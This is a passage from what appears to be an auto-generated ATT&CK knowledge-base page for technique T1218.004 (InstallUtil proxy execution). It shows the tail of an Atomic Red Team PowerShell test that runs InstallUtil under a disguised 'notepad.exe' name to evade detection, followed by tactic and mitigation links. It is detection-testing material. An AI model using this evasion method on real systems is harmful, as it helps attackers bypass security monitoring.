                                                                                                                  'OutputAssemblyDirectory '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyDir\n'
                                                                                                                  '    '
                                                                                                                  'OutputAssemblyFileName '
                                                                                                                  '= '
                                                                                                                  '$InstallerAssemblyFileName\n'
                                                                                                                  '    '
                                                                                                                  'InvocationMethod '
                                                                                                                  '= '
                                                                                                                  "'Executable'\n"
                                                                                                                  '    '
                                                                                                                  'CommandLine '
                                                                                                                  '= '
                                                                                                                  '$CommandLine\n'
                                                                                                                  '    '
                                                                                                                  'InstallUtilPath '
                                                                                                                  '= '
                                                                                                                  '"$Env:windir\\System32\\Tasks\\notepad.exe"\n'
                                                                                                                  '}\n'
                                                                                                                  '\n'
                                                                                                                  '$ActualOutput '
                                                                                                                  '= '
                                                                                                                  'Invoke-BuildAndInvokeInstallUtilAssembly '
                                                                                                                  '@TestArgs '
                                                                                                                  '-MinimumViableAssembly\n'
                                                                                                                  '\n'
                                                                                                                  'if '
                                                                                                                  '($ActualOutput '
                                                                                                                  '-ne '
                                                                                                                  '$ExpectedOutput) '
                                                                                                                  '{\n'
                                                                                                                  '    '
                                                                                                                  'throw '
                                                                                                                  '@"\n'
                                                                                                                  'Evasive '
                                                                                                                  'Installutil '
                                                                                                                  'invocation '
                                                                                                                  'test '
                                                                                                                  'failure. '
                                                                                                                  'Installer '
                                                                                                                  'assembly '
                                                                                                                  'execution '
                                                                                                                  'output '
                                                                                                                  'did '
                                                                                                                  'not '
                                                                                                                  'match '
                                                                                                                  'the '
                                                                                                                  'expected '
                                                                                                                  'output.\n'
                                                                                                                  'Expected: '
                                                                                                                  '$ExpectedOutput\n'
                                                                                                                  'Actual: '
                                                                                                                  '$ActualOutput\n'
                                                                                                                  '"@\n'
                                                                                                                  '}\n',
                                                                                                       'name': 'powershell'},
                                                                                          'input_arguments': {'test_harness': {'default': 'PathToAtomicsFolder\\T1218.004\\src\\InstallUtilTestHarness.ps1',
                                                                                                                               'description': 'location '
                                                                                                                                              'of '
                                                                                                                                              'the '
                                                                                                                                              'test '
                                                                                                                                              'harness '
                                                                                                                                              'script '
                                                                                                                                              '- '
                                                                                                                                              'Invoke-BuildAndInvokeInstallUtilAssembly',
                                                                                                                               'type': 'Path'}},
                                                                                          'name': 'InstallUtil '
                                                                                                  'evasive '
                                                                                                  'invocation',
                                                                                          'supported_platforms': ['windows']}],
                                                                        'attack_technique': 'T1218.004',
                                                                        'display_name': 'Signed '
                                                                                        'Binary '
                                                                                        'Proxy '
                                                                                        'Execution: '
                                                                                        'InstallUtil'}}]
```

# Tactics


* [Defense Evasion](../tactics/Defense-Evasion.md)


# Mitigations


* [Execution Prevention](../mitigations/Execution-Prevention.md)

* [Disable or Remove Feature or Program](../mitigations/Disable-or-Remove-Feature-or-Program.md)
    

# Actors

None
